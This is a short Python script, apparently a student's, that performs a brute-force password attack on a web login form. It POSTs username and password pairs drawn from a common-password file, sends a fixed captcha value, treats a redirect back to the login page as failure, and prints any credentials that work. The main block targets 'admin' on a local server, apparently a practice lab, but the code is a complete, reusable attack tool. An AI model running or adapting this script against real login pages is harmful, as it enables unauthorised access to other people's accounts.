# Description: This file contains a brute force attack on a login page.
# writen by:Jacob Zhang,2024/6/11
import requests


class Login_Success_Detector:
    """
    Class to detect if a login was successful
    params:
        login_url: the url of the login page
        wrong_response_url: the url of the page that is displayed when
                            the login is unsuccessful
    Because the detector need to be different based on the website,so
    I choose to separate the detector from the BruteForceAttack Class
    you need to implement the __call__ method personally to fit a specific website
    """

    def __init__(self, login_url: str = None, wrong_response_url: str = None):
        self.login_url = login_url
        self.wrong_response_url = wrong_response_url

    def __call__(self, username: str, password: str):
        """
        function to detect if a login was successful.In this case,
        I will check if the url is the same as the login_url because the website
        will redirect to the login page if the login is unsuccessful
        """
        data = {'username': username, 'password': password, 'captchaName': 'panda'}
        response = requests.post(self.login_url, data=data)
        if response.url == self.wrong_response_url:
            print(f"failed to login using Username: {username}, Password: {password}")
            print(response.url, self.login_url)
            return False
        print(f"Attempted login with Username: {username}, Password: {password}")
        return True


class BruteForceAttack:
    """
    Class to perform a brute force attack on a login page
    params:
        username_list: list of usernames to try
        password_list: list of passwords to try
        login_success_detector: a function to detect if a login was successful.
                you need to implement the __call__ method
                personally to fit a specific website
    methods:
        attempt_login: attempts to login with a given username and password
        brute_force: tries all combinations of usernames and passwords in the username_list and password_list
    """

    def __init__(self, login_success_detector,
                 password_list: list[str] = None, username_list: list[str] = None):

        self.password_list = password_list
        self.usernames_list = username_list
        self.login_success_detector = login_success_detector

    def brute_force(self):
        """
        function to try all combinations of usernames and passwords
        in the username_list and password_list
        """
        for username in self.usernames_list:
            for password in self.password_list:
                if self.login_success_detector(username, password):
                    print(f"Success! Username: {username}, Password: {password}")
                    return True
        print("Brute force attack failed")
        return False


if __name__ == '__main__':
    url = 'http://127.0.0.1:5000/login_cert'
    wrong_response_url = 'http://127.0.0.1:5000/login'
    username_list = ['admin', 'user', 'root']

    # load the password list
    password_list = []
    with open('Common Password List.txt', 'r', encoding='utf-8') as file:
        lines = file.readlines()
    # delete the '\n' at the end of each string,and delete the empty line(line == '\n')
    lines = [line.strip() for line in lines if line != '\n']

    # print the result to confirm the content
    # for line in lines[:10]:
    #     print(line)

    # create a login success detector
    login_success_detector = Login_Success_Detector(
        login_url=url, wrong_response_url=wrong_response_url)

    # process the brute force attack
    brute_force_attacker = BruteForceAttack(login_success_detector, password_list=lines,
                                            username_list=["admin"])
    print("Starting brute force attack...")

    brute_force_attacker.brute_force()
